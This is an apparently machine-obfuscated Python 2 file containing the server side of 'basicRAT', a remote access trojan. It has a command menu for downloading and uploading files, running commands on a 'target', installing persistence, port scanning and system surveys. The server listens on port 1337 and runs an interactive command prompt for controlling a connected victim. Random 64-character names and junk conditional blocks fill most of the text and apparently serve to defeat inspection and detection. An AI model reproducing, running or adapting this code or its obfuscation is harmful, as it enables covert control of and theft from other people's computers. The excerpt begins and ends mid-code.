        xeJkQbhItEtxLPboBtCUXGYvFBQxSWOnVLKKsnIOwPufLXNaqnpJbyaAgLEHlUwv = hZrBcvmsEqVaTvHvcaMAiBEIIfCRMeboAPGfnhFLNclZqmTYOZSIQgAayrITyANT
    else:
        xeJkQbhItEtxLPboBtCUXGYvFBQxSWOnVLKKsnIOwPufLXNaqnpJbyaAgLEHlUwv = 'aNnphQMAOnOIJmufWbcKNLpiPHtesgqnPKqIKEuMyUyjTSbLyNuwODiazGvQjTHP'
        xeJkQbhItEtxLPboBtCUXGYvFBQxSWOnVLKKsnIOwPufLXNaqnpJbyaAgLEHlUwv = ljgZZFzfKRnTDNHAHRYzDbhyOLMVsHPpqBDwTRBOySqhAMMbvmzKtaVICaWpgiTH
except ImportError as VaXAwMqUwaBLvuYETMQgvZyTtzlfDMWuiOXwvYrZVnTmmdLtVsiDLUCgqvcVkiRs:
    PGMNvOaBjIxTXgPLoVTUHwFVWZRCWipHhWDcDNIzZxKZUuzLxgzRUSvmkImvnMHF = 'xpPkIYhNWsVmgCxBEPZvSXpMAXVqYSapDHOeVOmYjSYHRJRuemhgzGDDfvKwdygB'
    qYyVMZZVGnWhjrKozAjfXhDhZtgIGMXYIyQMEogXPJGClEjuIxjmoGknyLLLKelf = 'LjoQuPCoesYNpuAxkUVzPMDxPfnvxllAxwXczbJkYtWGSwhsRfKRIhEdHWMYtYqw'
    iFjOcvyhDwioMNJWYcXGfNGVGyIXnImAmomqqpKQKOvOxnlCXxlmaKCbyZMaxOEx = 'vWXNHtLqtWZgQCOaDEjXgrtuycscIfmEueHJPxtLNeQcsFMHUaEgstIrmPVhRIsP'
    wBoHaFWvlASMtOceUFOczYyGdLcMsXvUGaCsiJdIWIENMTZLWhmusxLKnLjObFPx = 'ZmBBGcVPsihYztHgxhEundCSJjcxnjFKuiuGepvETGHLprYIobQQNjGpoSebzDct'
    yWgwBsFjOlyDZmsCnxEexRTOonFINIDRvfqNoRtOXDtBZIIPRwySlgDIrmaUjted = 'SBjZogUZUOtlNuCzmRUIJeFSaxFtfQtZIsHNbLMOpqjpBUqtmkrhBuHReXttrCaY'
    if PGMNvOaBjIxTXgPLoVTUHwFVWZRCWipHhWDcDNIzZxKZUuzLxgzRUSvmkImvnMHF in qYyVMZZVGnWhjrKozAjfXhDhZtgIGMXYIyQMEogXPJGClEjuIxjmoGknyLLLKelf:
        PGMNvOaBjIxTXgPLoVTUHwFVWZRCWipHhWDcDNIzZxKZUuzLxgzRUSvmkImvnMHF = yWgwBsFjOlyDZmsCnxEexRTOonFINIDRvfqNoRtOXDtBZIIPRwySlgDIrmaUjted
        if qYyVMZZVGnWhjrKozAjfXhDhZtgIGMXYIyQMEogXPJGClEjuIxjmoGknyLLLKelf in iFjOcvyhDwioMNJWYcXGfNGVGyIXnImAmomqqpKQKOvOxnlCXxlmaKCbyZMaxOEx:
            qYyVMZZVGnWhjrKozAjfXhDhZtgIGMXYIyQMEogXPJGClEjuIxjmoGknyLLLKelf = wBoHaFWvlASMtOceUFOczYyGdLcMsXvUGaCsiJdIWIENMTZLWhmusxLKnLjObFPx
    elif qYyVMZZVGnWhjrKozAjfXhDhZtgIGMXYIyQMEogXPJGClEjuIxjmoGknyLLLKelf in PGMNvOaBjIxTXgPLoVTUHwFVWZRCWipHhWDcDNIzZxKZUuzLxgzRUSvmkImvnMHF:
        iFjOcvyhDwioMNJWYcXGfNGVGyIXnImAmomqqpKQKOvOxnlCXxlmaKCbyZMaxOEx = qYyVMZZVGnWhjrKozAjfXhDhZtgIGMXYIyQMEogXPJGClEjuIxjmoGknyLLLKelf
        if iFjOcvyhDwioMNJWYcXGfNGVGyIXnImAmomqqpKQKOvOxnlCXxlmaKCbyZMaxOEx in qYyVMZZVGnWhjrKozAjfXhDhZtgIGMXYIyQMEogXPJGClEjuIxjmoGknyLLLKelf:
            qYyVMZZVGnWhjrKozAjfXhDhZtgIGMXYIyQMEogXPJGClEjuIxjmoGknyLLLKelf = yWgwBsFjOlyDZmsCnxEexRTOonFINIDRvfqNoRtOXDtBZIIPRwySlgDIrmaUjted
    print VaXAwMqUwaBLvuYETMQgvZyTtzlfDMWuiOXwvYrZVnTmmdLtVsiDLUCgqvcVkiRs
    ZSrLuJUKefTXhpUnwrvXCzQkUwxxFPpNDaJVDzMlzShcQtChNxcByKZCtlknMTKV = 'KmCkHPNmuCkEFgtaJRxZhLCykbhBNvjlGjbUdwCcoFsjpSGPQWEEWLuTtwBGcXlP'
    TtmicvwKmFiDNhmLiEmwnWbVvAXcAsTmGCppCoODbaMfPeVtndfFEeeHeqCtCnhU = 'xMDEhbYEYRqKgIVEFZYnEPMEahIwgvVeQXkdNOadpIUILKrLwumfByoJpbkpkkmG'
    MHdVDMIHSFGSuwhuUmLVWqfxwZpESNFaDvOYkFpesqBxCWbLovwNmyRBCnPGJJVb = 'METthGTgwepKpBNhXOwcDKHvrFwtwbBUZeLKnikcQkQnzKqwvDdYpAhooumEQyDi'
    if ZSrLuJUKefTXhpUnwrvXCzQkUwxxFPpNDaJVDzMlzShcQtChNxcByKZCtlknMTKV == TtmicvwKmFiDNhmLiEmwnWbVvAXcAsTmGCppCoODbaMfPeVtndfFEeeHeqCtCnhU:
        PxzzvXpqVWPIwpZhYzeSTQZOJPvzsGSMPuTdTtwWCVqJLLxWWtePopYdRiUDwZUD = 'ngOYcnXgbGqQKNhBSEPUSUAEcXPOszKIGuMVrIPKDfqlcZArgPuCOGpDwEQASOsc'
        PxzzvXpqVWPIwpZhYzeSTQZOJPvzsGSMPuTdTtwWCVqJLLxWWtePopYdRiUDwZUD = ZSrLuJUKefTXhpUnwrvXCzQkUwxxFPpNDaJVDzMlzShcQtChNxcByKZCtlknMTKV
    else:
        PxzzvXpqVWPIwpZhYzeSTQZOJPvzsGSMPuTdTtwWCVqJLLxWWtePopYdRiUDwZUD = 'ngOYcnXgbGqQKNhBSEPUSUAEcXPOszKIGuMVrIPKDfqlcZArgPuCOGpDwEQASOsc'
        PxzzvXpqVWPIwpZhYzeSTQZOJPvzsGSMPuTdTtwWCVqJLLxWWtePopYdRiUDwZUD = MHdVDMIHSFGSuwhuUmLVWqfxwZpESNFaDvOYkFpesqBxCWbLovwNmyRBCnPGJJVb
    sys.exit(0)
oBswzgPHJBvoFyPaGrxLulapgagbxMUnmMAfhmjVfovPbpVbznYzQABtqLEmzNJH = '''
download <files>    - Download file(s).
help                - Show this help menu.
persistence         - Apply persistence mechanism.
quit                - Gracefully kill client and server.
rekey               - Regenerate crypto key.
run <command>       - Execute a command on the target.
scan <ip>           - Scan top 25 ports on a single host.
survey              - Run a system survey.
unzip <file>        - Unzip a file.
upload <files>      - Upload files(s).
wget <url>          - Download a file from the web.
'''
CEHmiPIkhsunEbJhgjBaFBKhbeCBMohuSqBJgTjEAEbkCDMwomFrQNZwwgqBmvNp = '''
______           _     ______  ___ _____   _            _
| ___ \         (_)    | ___ \/ _ \_   _| | |          | |
| |_/ / __ _ ___ _  ___| |_/ / /_\ \| |   | |_ ___  ___| |_
| ___ \/ _` / __| |/ __|    /|  _  || |   | __/ _ \/ __| __|
| |_/ / (_| \__ \ | (__| |\ \| | | || |   | ||  __/\__ \ |_
\____/ \__,_|___/_|\___\_| \_\_| |_/\_/    \__\___||___/\__|
'''
nVfodLvrEpkGikVAdBkBHnxbSJMDgVWBYUrgGjtRsQKLcFLfQpTzcCWqZlTTAwqR = [
            'download', 'help', 'persistence', 'quit', 'rekey',
            'run', 'scan', 'survey', 'unzip', 'upload', 'wget'
]
def LMWmWhfFnmPXcaWqhiXZxePgOiMIoBouRHvxrXNABmsiHeMdsDeGDSlBeHLmlDvY():
    rtcerPEvqRBTiKUuxXPmqiYjtaCmqqNWeDboRyAHctYPLOLDxAyNaBkWmNudhvgV = argparse.ArgumentParser(description='basicRAT server')
    rtcerPEvqRBTiKUuxXPmqiYjtaCmqqNWeDboRyAHctYPLOLDxAyNaBkWmNudhvgV.add_argument('-p', '--port', help='Port to listen on.',
                        default=1337, type=int)
    return rtcerPEvqRBTiKUuxXPmqiYjtaCmqqNWeDboRyAHctYPLOLDxAyNaBkWmNudhvgV
def dOGhSjWYUiVJKUTgWbiCcLCNdCryPxWCQlhMeeUtYSPigcbRaVADpWqZmMyDOJBu():
    rtcerPEvqRBTiKUuxXPmqiYjtaCmqqNWeDboRyAHctYPLOLDxAyNaBkWmNudhvgV  = LMWmWhfFnmPXcaWqhiXZxePgOiMIoBouRHvxrXNABmsiHeMdsDeGDSlBeHLmlDvY()
    tugIWeCYOvJSbyCQWeZQtYIbUivsRllRODKJsRspBUPApESjEMtZLTDUoqRiFGtA    = vars(rtcerPEvqRBTiKUuxXPmqiYjtaCmqqNWeDboRyAHctYPLOLDxAyNaBkWmNudhvgV.parse_args())
    dbZDPfWdHKaAtlDxutGDOXlNPXvYHnONMJVkHRAPumzoSdJXhwCtNeHgzeCMYmhg    = tugIWeCYOvJSbyCQWeZQtYIbUivsRllRODKJsRspBUPApESjEMtZLTDUoqRiFGtA['port']
    AxlkcPzPdMmgkNbizTAFiMuFhhRypAoxvrQVNLKmIqdHkWbzfdMIXmYmFFnjdinW = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        pCJjKaEZxmgFFslTWCcRKEzUBMaZuUnAdjFHgxPoLVhpIZKkvOFINeYsUtsZEuMT = 'EWlxmWlHXKWVRwcqzpFSjIcfevqRnpOMYPRioVtyvTpNzCsrumuNnewekakYeewr'
        HENCZmJZNARKgqntqzjUaXrPRaByMqkjXIJhliaauPucaUjEHzXzhFJxPKKBkNEt = 'jMoYIuFjmdqIMPhYcajnlbzmMlldiLOErjMWadAYPotAafcmRGbLzGKQIcXsnSaK'
        RcSefddbWmtERjYPIkeiNklELyovcagbxYqYpQprQOLMIzxQJhbWMZPzVJSilrMP = 'gfthWTtPaaruuFLvZvmHGLpDMLOaPQQZXSCTYUUIucUoFtNtJqvDhtcMBezuTuyr'
        JZmRsBiYpzmMMdliTsdEdoJhbMtbuQQwAmhmIQKzuBTgsgQnBagCzaCnqnuKBzTQ = 'JGMPoocReMiiESWJdfKaXswfAnipqXbBeYudCSCTSijzWJaYFggOBcwpQAUfmCPS'
        ZQeulZyVNeKAjlbcVcTGfHzmPAChDZdHcGAAkQkhftlefvEPgBTtFhmlpytuorfi = 'knTTaXdwwQklMbFvnsWQsExSnmkiTKonnzsVXDkvjsmqKwKPXRigkFDKGIzSiAKK'
        nwRtknqAPpgyKMEftvVUVAsoBDCwtoMFMtzukQdweoPghZZrMybUzHyfUKHcwwjX = 'lUUqstwBmslcMiJXbMzvWhqOccUJOKsMmjDVusiDMKKFbcrsrRAfiCavdVXfeSeV'
        if pCJjKaEZxmgFFslTWCcRKEzUBMaZuUnAdjFHgxPoLVhpIZKkvOFINeYsUtsZEuMT != JZmRsBiYpzmMMdliTsdEdoJhbMtbuQQwAmhmIQKzuBTgsgQnBagCzaCnqnuKBzTQ:
            HENCZmJZNARKgqntqzjUaXrPRaByMqkjXIJhliaauPucaUjEHzXzhFJxPKKBkNEt = RcSefddbWmtERjYPIkeiNklELyovcagbxYqYpQprQOLMIzxQJhbWMZPzVJSilrMP
            for nwRtknqAPpgyKMEftvVUVAsoBDCwtoMFMtzukQdweoPghZZrMybUzHyfUKHcwwjX in JZmRsBiYpzmMMdliTsdEdoJhbMtbuQQwAmhmIQKzuBTgsgQnBagCzaCnqnuKBzTQ:
                if nwRtknqAPpgyKMEftvVUVAsoBDCwtoMFMtzukQdweoPghZZrMybUzHyfUKHcwwjX != RcSefddbWmtERjYPIkeiNklELyovcagbxYqYpQprQOLMIzxQJhbWMZPzVJSilrMP:
                    HENCZmJZNARKgqntqzjUaXrPRaByMqkjXIJhliaauPucaUjEHzXzhFJxPKKBkNEt = HENCZmJZNARKgqntqzjUaXrPRaByMqkjXIJhliaauPucaUjEHzXzhFJxPKKBkNEt
                else:
                    ZQeulZyVNeKAjlbcVcTGfHzmPAChDZdHcGAAkQkhftlefvEPgBTtFhmlpytuorfi = pCJjKaEZxmgFFslTWCcRKEzUBMaZuUnAdjFHgxPoLVhpIZKkvOFINeYsUtsZEuMT
        else:
            RcSefddbWmtERjYPIkeiNklELyovcagbxYqYpQprQOLMIzxQJhbWMZPzVJSilrMP = pCJjKaEZxmgFFslTWCcRKEzUBMaZuUnAdjFHgxPoLVhpIZKkvOFINeYsUtsZEuMT
            pCJjKaEZxmgFFslTWCcRKEzUBMaZuUnAdjFHgxPoLVhpIZKkvOFINeYsUtsZEuMT = ZQeulZyVNeKAjlbcVcTGfHzmPAChDZdHcGAAkQkhftlefvEPgBTtFhmlpytuorfi
            if RcSefddbWmtERjYPIkeiNklELyovcagbxYqYpQprQOLMIzxQJhbWMZPzVJSilrMP == pCJjKaEZxmgFFslTWCcRKEzUBMaZuUnAdjFHgxPoLVhpIZKkvOFINeYsUtsZEuMT:
                for nwRtknqAPpgyKMEftvVUVAsoBDCwtoMFMtzukQdweoPghZZrMybUzHyfUKHcwwjX in pCJjKaEZxmgFFslTWCcRKEzUBMaZuUnAdjFHgxPoLVhpIZKkvOFINeYsUtsZEuMT:
                    if nwRtknqAPpgyKMEftvVUVAsoBDCwtoMFMtzukQdweoPghZZrMybUzHyfUKHcwwjX == RcSefddbWmtERjYPIkeiNklELyovcagbxYqYpQprQOLMIzxQJhbWMZPzVJSilrMP:
                        RcSefddbWmtERjYPIkeiNklELyovcagbxYqYpQprQOLMIzxQJhbWMZPzVJSilrMP = pCJjKaEZxmgFFslTWCcRKEzUBMaZuUnAdjFHgxPoLVhpIZKkvOFINeYsUtsZEuMT
                    else:
                        RcSefddbWmtERjYPIkeiNklELyovcagbxYqYpQprQOLMIzxQJhbWMZPzVJSilrMP = ZQeulZyVNeKAjlbcVcTGfHzmPAChDZdHcGAAkQkhftlefvEPgBTtFhmlpytuorfi
        AxlkcPzPdMmgkNbizTAFiMuFhhRypAoxvrQVNLKmIqdHkWbzfdMIXmYmFFnjdinW.bind(('0.0.0.0', dbZDPfWdHKaAtlDxutGDOXlNPXvYHnONMJVkHRAPumzoSdJXhwCtNeHgzeCMYmhg))
    except socket.error:
        wlRobhBtlrVmfENaZBasyaPwRAwUdzQZjhOhJzvkZfAUQyTILAPHztWjGulTvPuu = 'nVwrTYoFJnuEvJwKZgJGCAbhqyKuvasVXkBxsKDSutdzpsoElFmvPMFkODgAxhVM'
        PaSgpuEmWwHGrIexezZaSfnmSyZASGkBwOwWUrSbOJUzqLhRVkTgybenSkktqQRb = 'kKIrCggpiTTcEMDMkRpyQgvGcWmMEPZisPdHWgjAZYQAjkkzBeZCyoTLTSorJUeR'
        GdkGLYumEXolYWraqfNabIjTKxxuAtRhJckEYxaqlWEUJEiNnzEDjIFGfqmsOVTf = 'vOjphIDLpVASDOYrvDTPBEXJJIBZoKdWMrHaDnzPzFPjtYknKJiXpCKAgguXBivB'
        BwoNlJcJEpSAzuIJEhAWitZhzTfnTZObNKzwmRFZlvqNPoZcHUhWePRUNuqMiWla = 'jsDVQZcBqBQdZwLlQZsmOxoOmRhgDQUhxjUpbtznOlITSbjDrYszwiDvFQoHXcat'
        OopTRkMPsegFOPsBYmBLnuyIyTAuUcsrClbjGwalFGJyWrRZqxRgOTtGumLwWLFu = 'aSTgemRABYrgtnLqPkqhMYdxdIwzqLDRnZxICGjDxQsRbBynjFwsRBvLRGcWKPgx'
        GLnGnDLcEACoxvSXVRdnCXFUZETbWwEtCiFLSyBcAOyydWcdFqMJiWUptEjhaxuZ = 'AJEEOVJPYiQjapvEiMkZZcsiRTBFjubvPQLAdvWMqlCYKZJbBGDzraXmWfoFHlgO'
        if wlRobhBtlrVmfENaZBasyaPwRAwUdzQZjhOhJzvkZfAUQyTILAPHztWjGulTvPuu != BwoNlJcJEpSAzuIJEhAWitZhzTfnTZObNKzwmRFZlvqNPoZcHUhWePRUNuqMiWla:
            PaSgpuEmWwHGrIexezZaSfnmSyZASGkBwOwWUrSbOJUzqLhRVkTgybenSkktqQRb = GdkGLYumEXolYWraqfNabIjTKxxuAtRhJckEYxaqlWEUJEiNnzEDjIFGfqmsOVTf
            for GLnGnDLcEACoxvSXVRdnCXFUZETbWwEtCiFLSyBcAOyydWcdFqMJiWUptEjhaxuZ in BwoNlJcJEpSAzuIJEhAWitZhzTfnTZObNKzwmRFZlvqNPoZcHUhWePRUNuqMiWla:
                if GLnGnDLcEACoxvSXVRdnCXFUZETbWwEtCiFLSyBcAOyydWcdFqMJiWUptEjhaxuZ != GdkGLYumEXolYWraqfNabIjTKxxuAtRhJckEYxaqlWEUJEiNnzEDjIFGfqmsOVTf:
                    PaSgpuEmWwHGrIexezZaSfnmSyZASGkBwOwWUrSbOJUzqLhRVkTgybenSkktqQRb = PaSgpuEmWwHGrIexezZaSfnmSyZASGkBwOwWUrSbOJUzqLhRVkTgybenSkktqQRb
                else:
                    OopTRkMPsegFOPsBYmBLnuyIyTAuUcsrClbjGwalFGJyWrRZqxRgOTtGumLwWLFu = wlRobhBtlrVmfENaZBasyaPwRAwUdzQZjhOhJzvkZfAUQyTILAPHztWjGulTvPuu
        else:
            GdkGLYumEXolYWraqfNabIjTKxxuAtRhJckEYxaqlWEUJEiNnzEDjIFGfqmsOVTf = wlRobhBtlrVmfENaZBasyaPwRAwUdzQZjhOhJzvkZfAUQyTILAPHztWjGulTvPuu
            wlRobhBtlrVmfENaZBasyaPwRAwUdzQZjhOhJzvkZfAUQyTILAPHztWjGulTvPuu = OopTRkMPsegFOPsBYmBLnuyIyTAuUcsrClbjGwalFGJyWrRZqxRgOTtGumLwWLFu
            if GdkGLYumEXolYWraqfNabIjTKxxuAtRhJckEYxaqlWEUJEiNnzEDjIFGfqmsOVTf == wlRobhBtlrVmfENaZBasyaPwRAwUdzQZjhOhJzvkZfAUQyTILAPHztWjGulTvPuu:
                for GLnGnDLcEACoxvSXVRdnCXFUZETbWwEtCiFLSyBcAOyydWcdFqMJiWUptEjhaxuZ in wlRobhBtlrVmfENaZBasyaPwRAwUdzQZjhOhJzvkZfAUQyTILAPHztWjGulTvPuu:
                    if GLnGnDLcEACoxvSXVRdnCXFUZETbWwEtCiFLSyBcAOyydWcdFqMJiWUptEjhaxuZ == GdkGLYumEXolYWraqfNabIjTKxxuAtRhJckEYxaqlWEUJEiNnzEDjIFGfqmsOVTf:
                        GdkGLYumEXolYWraqfNabIjTKxxuAtRhJckEYxaqlWEUJEiNnzEDjIFGfqmsOVTf = wlRobhBtlrVmfENaZBasyaPwRAwUdzQZjhOhJzvkZfAUQyTILAPHztWjGulTvPuu
                    else:
                        GdkGLYumEXolYWraqfNabIjTKxxuAtRhJckEYxaqlWEUJEiNnzEDjIFGfqmsOVTf = OopTRkMPsegFOPsBYmBLnuyIyTAuUcsrClbjGwalFGJyWrRZqxRgOTtGumLwWLFu
        print 'Error: Unable to start xajyzlziGIBbeDZrDFPxZyRlmXKlrFomInKMTMtEtxtAtMXpyMdrQRsnnxAXXLLz, dbZDPfWdHKaAtlDxutGDOXlNPXvYHnONMJVkHRAPumzoSdJXhwCtNeHgzeCMYmhg {} in use?'.format(dbZDPfWdHKaAtlDxutGDOXlNPXvYHnONMJVkHRAPumzoSdJXhwCtNeHgzeCMYmhg)
        sys.exit(1)
    for imVZktmGMuPmlOWgGuXHdKxCyXNwdONjkDijFuFxLQsnXOnKkKMQLvtwtiZUVEDW in CEHmiPIkhsunEbJhgjBaFBKhbeCBMohuSqBJgTjEAEbkCDMwomFrQNZwwgqBmvNp.split('\n'):
        eWyAHuGlWTJJYJLBtkOEgOHTPkhxwQRReypJBBLeAiKAsxeIVKdWEtuFVkCXHksl = 'vrRlAwPThzIsYMiHjihSXhcYdXQBaROVAbljttdGiiuGZDkYOeGcQTyaWlXEQFSa'
        YkOgVbqhpGmknefiQGmOIMwseLQxytMWQcWQDIusBovwmAUPZcCHwdkRVFPRCFDa = 'zGVkjkTnHMSZhUCbzKMxueoKBFQfgoXbSxCUTnLmmKWhYURrBGwiIVgllrkPHjyl'
        if eWyAHuGlWTJJYJLBtkOEgOHTPkhxwQRReypJBBLeAiKAsxeIVKdWEtuFVkCXHksl != YkOgVbqhpGmknefiQGmOIMwseLQxytMWQcWQDIusBovwmAUPZcCHwdkRVFPRCFDa:
            CrVXDDpKThppWshBsYeaRghXFfDzFxMFyuUWTUmYuHmOEdmwOSdrqGlPaMMCzOdN = 'XsUjAmLQkZMdDBusSVOJFyNpbGDEnRVCToFJnuAXEgjcwHkyNHOBfJRoOyRnjJIW'
            PbLdeZhSuQgHJvgFtKPFIWTjqunEHUzVEqrXocurTBsCOZQtPBuItzmMNRzzMgwe = 'NRBtqHyQTOtDvJCdFurhXjWiDAJqtpJiFAVeNnaAHTbiXZvoJnZPsryQvVlvpJJN'
            PbLdeZhSuQgHJvgFtKPFIWTjqunEHUzVEqrXocurTBsCOZQtPBuItzmMNRzzMgwe = CrVXDDpKThppWshBsYeaRghXFfDzFxMFyuUWTUmYuHmOEdmwOSdrqGlPaMMCzOdN
        time.sleep(0.05)
        print imVZktmGMuPmlOWgGuXHdKxCyXNwdONjkDijFuFxLQsnXOnKkKMQLvtwtiZUVEDW
        lTpGdunAMyaiZRivVvWpdWywWBrTQvULdRnKAUTuMHyUUBVgWibCYWQuUIoYDOhK = 'CKYPfEotdsDKxVlSlAxpbhiJliIFFXlbJhvchjVYzCEbhULSRjAujaVOXVvhDkOt'
        mjMhCHmbtoFgZDRaGcGbDZbcqBxtFVzkBYxUNtlvOQaNXqnEHEykxvNwEFbPjFmO = 'GJaEmlCeFyMCOztvMKXBawxBGGPDlAmhzJSaPiaOnDpviciqraVNdSxUbaoyLWHU'
        ovYjoWoWFUkbytrKJMtiUqVgBjycjpKkQYHiUmtWonGJyGViEISwOlgLPkksjkUP = 'MYxIyTGNGkdsMoOTVfLLgAuGJhlXsTCZxFYajChDcWjMAMqkCyOEYloQSySGLCcs'
        if lTpGdunAMyaiZRivVvWpdWywWBrTQvULdRnKAUTuMHyUUBVgWibCYWQuUIoYDOhK == mjMhCHmbtoFgZDRaGcGbDZbcqBxtFVzkBYxUNtlvOQaNXqnEHEykxvNwEFbPjFmO:
            OIUeByDLmAwTBeyduVvfFaNBhOuBYFpQwQiTRxSQMZrJRkRzsAzKJsqrzBjoYIZv = 'JlucSuHYCrmuWtcoEdUfQaELQmABtuEmPolVsnuCqwTLIMPJWiQXNThxjPWJUYqC'
            OIUeByDLmAwTBeyduVvfFaNBhOuBYFpQwQiTRxSQMZrJRkRzsAzKJsqrzBjoYIZv = lTpGdunAMyaiZRivVvWpdWywWBrTQvULdRnKAUTuMHyUUBVgWibCYWQuUIoYDOhK
        else:
            OIUeByDLmAwTBeyduVvfFaNBhOuBYFpQwQiTRxSQMZrJRkRzsAzKJsqrzBjoYIZv = 'JlucSuHYCrmuWtcoEdUfQaELQmABtuEmPolVsnuCqwTLIMPJWiQXNThxjPWJUYqC'
            OIUeByDLmAwTBeyduVvfFaNBhOuBYFpQwQiTRxSQMZrJRkRzsAzKJsqrzBjoYIZv = ovYjoWoWFUkbytrKJMtiUqVgBjycjpKkQYHiUmtWonGJyGViEISwOlgLPkksjkUP
    print 'basicRAT xajyzlziGIBbeDZrDFPxZyRlmXKlrFomInKMTMtEtxtAtMXpyMdrQRsnnxAXXLLz listening on dbZDPfWdHKaAtlDxutGDOXlNPXvYHnONMJVkHRAPumzoSdJXhwCtNeHgzeCMYmhg {}...'.format(dbZDPfWdHKaAtlDxutGDOXlNPXvYHnONMJVkHRAPumzoSdJXhwCtNeHgzeCMYmhg)
    AxlkcPzPdMmgkNbizTAFiMuFhhRypAoxvrQVNLKmIqdHkWbzfdMIXmYmFFnjdinW.listen(10)
    POrWUgFUfVnmklKofNAoQFzJtmbYjDkiuCYHDPxrZURuFkDzDdfENVrppqVAnWPI, fjexABBahfqBBgCaGhTHMqFlrmBbJfFSEsLVIsWTWaOCKuUXTBmGeYLtTMJxxfRt = AxlkcPzPdMmgkNbizTAFiMuFhhRypAoxvrQVNLKmIqdHkWbzfdMIXmYmFFnjdinW.accept()
    WrUuPzYKOYdtlInRkQYyVQVeVJdYkUPpiVDMFnRoFktTOxCYrteRaycUQJDibwLz = ZnSlsMtPHuxZiZtdggZNNZbzlZGOKaVkpkTQLVelCtNuiCQWxtNSxMyhJZsAWbwr(POrWUgFUfVnmklKofNAoQFzJtmbYjDkiuCYHDPxrZURuFkDzDdfENVrppqVAnWPI, xajyzlziGIBbeDZrDFPxZyRlmXKlrFomInKMTMtEtxtAtMXpyMdrQRsnnxAXXLLz=True)
    while True:
        PDLxgtrvUOTzzxfSDyVggjovdDFZLyujhxAUuVCrlwSEIdNRxIpKRRTOllJtlvdl = 'nQMhjKJGRDgXdKmZSEexOVTvEEJCmnQqAEuJmfxhlqaCEcwbpowhLJsDrUrBvshe'
        XfRtXEofwrXoXyJjvPDxicrFfPgoLxXYumpgkXREnjUBcVqlNJDpNFNomdbSoCKq = 'uXPFUXWNwBUiefZiLGgDdLLLtEnPbQuKIHMyvsHoPRsXHGVnNJDGVeAbPcISiNdW'
        VWuOLJAMBlEkOGppeLkDmJozPWDIUqYQQzItfoxYLvaMHIjwXfGvdZJmtDJTNpEA = 'HAPgjkUnenbIlSDtzdddkfcBgfdNEfiGeBZotlkAfPCKhxqlkieLVylfrbxtZGef'
        AdCRgMTexxnlLDFpjfQmBdcQsrQtukwfIUMXZMrJnDlizxOtkzTaaBhkAHZnOIED = 'cggdThOaYFGovbAjPIuApTzACXKbsPgNmaYyDACCIPGrdjNlwSTRfrpSwAaVqlPE'
        tRtyxcIepdQkMwwgCXlMDvvthrmKTjNNqaTZDmlFeTaJcpQvELyGdTcbtqzceOGh = 'umSSUcmstmfebWSJhqRzIUhXhgHBOOfKcRrBXNBYXgWJzmFdRnfXlcTZyYUCOAum'
        gwEZiVhEpgCgpbqULbQnFyRemKZRseINeJsqPVBVCSIEvrIXpIPGIYodRgavLvfS = 'UkIUqGVTEQjkfisOyayIcvrsJDXmTxwTUfaRrkLfRLkkcnxsiDZqVikxDMmjNbNu'
        if VWuOLJAMBlEkOGppeLkDmJozPWDIUqYQQzItfoxYLvaMHIjwXfGvdZJmtDJTNpEA == AdCRgMTexxnlLDFpjfQmBdcQsrQtukwfIUMXZMrJnDlizxOtkzTaaBhkAHZnOIED:
            for gwEZiVhEpgCgpbqULbQnFyRemKZRseINeJsqPVBVCSIEvrIXpIPGIYodRgavLvfS in tRtyxcIepdQkMwwgCXlMDvvthrmKTjNNqaTZDmlFeTaJcpQvELyGdTcbtqzceOGh:
                if gwEZiVhEpgCgpbqULbQnFyRemKZRseINeJsqPVBVCSIEvrIXpIPGIYodRgavLvfS == AdCRgMTexxnlLDFpjfQmBdcQsrQtukwfIUMXZMrJnDlizxOtkzTaaBhkAHZnOIED:
                    tRtyxcIepdQkMwwgCXlMDvvthrmKTjNNqaTZDmlFeTaJcpQvELyGdTcbtqzceOGh = PDLxgtrvUOTzzxfSDyVggjovdDFZLyujhxAUuVCrlwSEIdNRxIpKRRTOllJtlvdl
                else:
                    AdCRgMTexxnlLDFpjfQmBdcQsrQtukwfIUMXZMrJnDlizxOtkzTaaBhkAHZnOIED = XfRtXEofwrXoXyJjvPDxicrFfPgoLxXYumpgkXREnjUBcVqlNJDpNFNomdbSoCKq
        pwROCCYHlsXEkeKmQQOCVOFLGcGznPMSuKtshjCqppFrTCYdRGGZXmjQhUBKBxkp = raw_input('\n[{}] basicRAT> '.format(fjexABBahfqBBgCaGhTHMqFlrmBbJfFSEsLVIsWTWaOCKuUXTBmGeYLtTMJxxfRt[0])).rstrip()
        if not pwROCCYHlsXEkeKmQQOCVOFLGcGznPMSuKtshjCqppFrTCYdRGGZXmjQhUBKBxkp:
            bDSMDZLYFdRAdWNXigJYcehPGTlrRnKrbTfLNBNkLXdpbeHekiEPhzGpEMCUMYNb = 'BTouHRnQpuDWEqeBPGmdeJSDjgIeMZlxQndvLdnetglaSKsbwVHnVASmNQcEUWdn'
            HYDMLOtTuZADRjSLuJqEOisDaChEADoTSccyjeUnMMjklCiheocaVMBfPyoGWbyx = 'VIWPDQqSCJNOeOVTNupmYteYxFlMHFnZhcYsYXPAfnbSwwcPIHodhAeeMuEsxubc'
            pJvYyeVxPmIbNAyhQhEoAyYxPkBOBNQcmtrjiKmIUXJiUblRmFXdstReFZWWUCdX = 'LcjDRvTTHnZTFOrHHJYIiUDbIuxIugRRAIMoCVpkxJpgAgyAMAkPotxTHcRnpTPC'
            FuyvogABVpzFBPWmdQdaIynIFfoURXvLgtyFcGNbDnSwCgkHHVApBfmzmvxaoejP = 'UxphsBMWBMHkjPtHlTowYEGUxzHVVrzasTnGyHOxShKWdpeYmlFeLjgHPNXTwvkV'
            ovbSqctGuosYQmsChPVOVFoqozAtynsWLuFSpHineAIRzvIeCFESGBwyscZAQyzJ = 'isLiEBqFrLJQFqEXYhhaYaLXlmwkqxbdaqPOQJkkmysklTLPyhEfVvWJzmRTRtjJ'
            zwNshLcyKVMLwLbrLCAgtclNscYOnlGCkXeTMQrFszVWSKQQQbyEvTqFRukLiGGE = 'OVsjApydVFoILynaZhOjbUZSHPzAGwnlAZuSVghvDXtAWAyBmxAECQKKFkxSHRpW'
            if bDSMDZLYFdRAdWNXigJYcehPGTlrRnKrbTfLNBNkLXdpbeHekiEPhzGpEMCUMYNb != FuyvogABVpzFBPWmdQdaIynIFfoURXvLgtyFcGNbDnSwCgkHHVApBfmzmvxaoejP:
                HYDMLOtTuZADRjSLuJqEOisDaChEADoTSccyjeUnMMjklCiheocaVMBfPyoGWbyx = pJvYyeVxPmIbNAyhQhEoAyYxPkBOBNQcmtrjiKmIUXJiUblRmFXdstReFZWWUCdX
